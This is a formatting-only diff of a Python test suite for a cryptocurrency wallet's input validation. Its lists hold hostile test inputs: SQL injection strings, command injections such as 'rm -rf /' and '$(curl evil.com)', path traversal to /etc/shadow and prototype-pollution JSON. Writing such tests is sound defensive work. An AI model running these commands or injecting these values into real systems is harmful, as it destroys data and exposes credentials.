@@ -10,7 +10,7 @@ import os
 import json
 
 # Add core directory to path
-sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'core'))
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "core"))
 
 from blockchain import Blockchain, Transaction
 from wallet import Wallet
@@ -25,8 +25,10 @@ class TestAddressValidation:
 
         assert wallet.address.startswith("XAI")
         assert len(wallet.address) == 43
-        assert all(c in '0123456789abcdefABCDEF' or c == 'X' or c == 'A' or c == 'I'
-                   for c in wallet.address)
+        assert all(
+            c in "0123456789abcdefABCDEF" or c == "X" or c == "A" or c == "I"
+            for c in wallet.address
+        )
 
     def test_reject_invalid_address_prefix(self):
         """Test rejection of invalid address prefix"""
@@ -138,7 +140,7 @@ class TestAmountValidation:
         bc.mine_pending_transactions(sender.address)
 
         try:
-            tx = Transaction(sender.address, recipient.address, float('inf'), 0.24)
+            tx = Transaction(sender.address, recipient.address, float("inf"), 0.24)
             tx.public_key = sender.public_key
             tx.sign_transaction(sender.private_key)
 
@@ -157,7 +159,7 @@ class TestAmountValidation:
         bc.mine_pending_transactions(sender.address)
 
         try:
-            tx = Transaction(sender.address, recipient.address, float('nan'), 0.24)
+            tx = Transaction(sender.address, recipient.address, float("nan"), 0.24)
             tx.public_key = sender.public_key
             tx.sign_transaction(sender.private_key)
 
@@ -183,7 +185,7 @@ class TestInjectionAttacks:
             "XAI'; DROP TABLE transactions; --",
             "XAI' OR '1'='1",
             "XAI'; DELETE FROM blocks WHERE 1=1; --",
-            "XAI' UNION SELECT * FROM wallets; --"
+            "XAI' UNION SELECT * FROM wallets; --",
         ]
 
         for injection in sql_injections:
@@ -206,7 +208,7 @@ class TestInjectionAttacks:
             "XAI; rm -rf /",
             "XAI$(curl evil.com)",
             "XAI`whoami`",
-            "XAI|cat /etc/passwd"
+            "XAI|cat /etc/passwd",
         ]
 
         for injection in cmd_injections:
@@ -224,7 +226,7 @@ class TestInjectionAttacks:
         malicious_paths = [
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\config\\sam",
-            "/etc/shadow"
+            "/etc/shadow",
         ]
 
         for path in malicious_paths:
@@ -244,7 +246,7 @@ class TestInjectionAttacks:
         malicious_json = [
             '{"address": "XAI123", "balance": 999999}',
             '{"__proto__": {"isAdmin": true}}',
-            '{"constructor": {"prototype": {"isAdmin": true}}}'
+            '{"constructor": {"prototype": {"isAdmin": true}}}',
         ]
 
         for payload in malicious_json:
@@ -473,5 +475,5 @@ class TestTypeValidation:
         assert block.timestamp > 0
 
 
-if __name__ == '__main__':
-    pytest.main([__file__, '-v', '-s'])
+if __name__ == "__main__":
+    pytest.main([__file__, "-v", "-s"])
